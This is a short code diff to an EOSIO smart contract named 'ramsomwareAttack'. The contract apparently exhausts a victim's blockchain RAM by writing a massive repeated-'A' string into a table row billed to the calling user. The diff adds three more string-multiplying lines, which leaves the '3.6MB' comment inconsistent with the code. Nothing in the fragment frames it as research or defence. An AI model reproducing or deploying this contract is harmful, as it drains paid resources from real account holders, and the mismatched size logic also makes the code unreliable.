@@ -24,6 +24,9 @@ class [[eosio::contract]] ramsomwareAttack : public eosio::contract {
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
             // 3.6MB CONSUME (MAX 4MB)
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
@@ -36,7 +39,7 @@ class [[eosio::contract]] ramsomwareAttack : public eosio::contract {
 
         [[eosio::action]]
         void main(name client, uint64_t idx)
-        {
+       {
             uint128_t initnum = 1;
 
             transaction out1{};
